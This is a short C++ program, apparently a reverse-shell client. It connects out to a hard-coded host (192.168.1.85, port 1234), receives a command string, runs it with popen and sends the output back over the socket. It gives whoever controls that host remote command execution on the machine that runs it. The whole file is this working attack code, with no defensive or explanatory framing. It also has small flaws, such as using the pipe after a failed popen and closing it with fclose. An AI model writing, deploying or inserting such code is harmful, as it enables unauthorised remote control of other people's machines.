#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstdlib>
#include <cstring>
using namespace std;

int check(int a)
{
    if(a==-1)
    {
        cout<<"An Error is Occured "<<endl;
        exit(0);
    }
    return 1;
}

int main()
{
    int server=socket(AF_INET,SOCK_STREAM,0);
    struct sockaddr_in address;
    address.sin_family=AF_INET;
    address.sin_port=htons(1234);
    string ip="192.168.1.85";
    inet_pton(AF_INET,ip.c_str(),&address.sin_addr);
    int r= connect(server,(struct sockaddr*)&address,sizeof(address));
    check(r);
    char buffer[4096];
    memset(buffer, 0, sizeof(buffer));
    int l=recv(server,buffer,4096,0);
    FILE* p=popen(buffer,"r");
    if(p==nullptr)
    {
        cout<<"Nothing to send";
    }
    char result[4096];
    string endresult;
    while(fgets(result,sizeof(result),p)!=nullptr)
    {
        endresult +=result;
    }
    int s=send(server,endresult.c_str(),endresult.size(),0);
    check(s);
    fclose(p);
    close(server);
}